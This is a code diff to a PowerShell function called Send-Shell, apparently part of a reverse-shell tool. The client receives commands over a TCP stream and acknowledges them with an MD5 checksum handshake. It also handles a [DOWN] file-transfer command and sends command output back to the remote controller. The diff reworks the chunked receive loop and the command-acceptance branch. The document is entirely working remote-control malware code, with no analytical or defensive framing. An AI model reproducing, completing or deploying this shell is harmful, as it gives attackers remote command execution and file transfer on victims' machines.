@@ -32,23 +32,17 @@ function Send-Shell
     $encoding = New-Object Text.AsciiEncoding
 
     function receive_data{
-        $data = ""
         do {
-            $chunk = $NetworkStream.Read($Buffer, 0, $Buffer.Length)
-            $data = $encoding.GetString($buffer, 0, $chunk)
-            if ($data.StartsWith('[BUFFER]')){
-                try{
-                    $size = [int]$Data.Split(' ')[1]
-                    if ($size -gt $Buffer.Length){
-                        $buffer = New-Object Byte[] $size
-                    }
-                    $StreamWriter.Write('[OKSIZE]')
-                    $StreamWriter.Flush()
-                }catch{
-                    $StreamWriter.Write('[ERROR]')
-                    $StreamWriter.Flush()
+            $data = ""
+            while ($true){
+                $chunk = $NetworkStream.Read($Buffer, 0, $Buffer.Length)
+                $part = $encoding.GetString($buffer, 0, $chunk)
+                $data += $part
+                if ($part.Length -lt 1024){
+                    break
                 }
-            }elseif ($data.StartsWith('[CHECKSUM]')){
+            }
+            if ($data.StartsWith('[CHECKSUM]')){
                 try{
                     if ($Data.Split(' ')[1] -eq $sum){
                         $StreamWriter.Write('[OKSUM]')
@@ -68,30 +62,26 @@ function Send-Shell
                     if ($data.Contains("[BUFFER]") -or $data.Contains("[CHECKSUM]")){
                         $StreamWriter.Write('[ERROR]')
                         $StreamWriter.Flush()
+                    }else{
+                        $cmd = $data
+                        $mystream = [IO.MemoryStream]::new([byte[]][char[]]$cmd)
+                        $sum = (Get-FileHash -InputStream $mystream -Algorithm MD5).Hash
+                        $mystream.dispose()
+                        Remove-Variable mystream
+                        $StreamWriter.Write('[OKCMD]')
+                        $StreamWriter.Flush()
                     }
-                    $cmd = $data
-                    $mystream = [IO.MemoryStream]::new([byte[]][char[]]$cmd)
-                    $sum = (Get-FileHash -InputStream $mystream -Algorithm MD5).Hash
-                    $mystream.dispose()
-                    Remove-Variable mystream
-                    $StreamWriter.Write('[OKCMD]')
-                    $StreamWriter.Flush()
                 }catch{
                     $StreamWriter.Write('[ERROR]')
                     $StreamWriter.Flush()
                 }
             }
+            #start-sleep -Milliseconds 1
         }while ($True -and $TCPClient.Connected)
-
-        if ($buffer.Length -gt $BUF_SIZE){
-            $buffer = New-Object Byte[] $BUF_SIZE
-        }
     }
 
     while ($TCPClient.Connected){
-        
         $cmd = receive_data
-
         if ($cmd.StartsWith('[DOWN]')){
             try {
                 $finish = $false
@@ -109,11 +99,11 @@ function Send-Shell
                     $StreamWriter.WriteLine('[+] Downloaded Successfully!')
                     $StreamWriter.Flush()
                     $fs.close()
+                    $cmd = ' '
                     Remove-Variable fs, bytes, finish, b
                 }
                 $StreamWriter.WriteLine(' ')
                 $StreamWriter.Flush()
-                continue
             }catch{
                 #$fs.close()
                 #Remove-Variable fs, bytes, b, app
@@ -140,7 +130,6 @@ function Send-Shell
                         }
         $StreamWriter.WriteLine($Output)#!
         $StreamWriter.Flush()
-        start-sleep -Milliseconds 10
     }
     $StreamWriter.Close()
 }
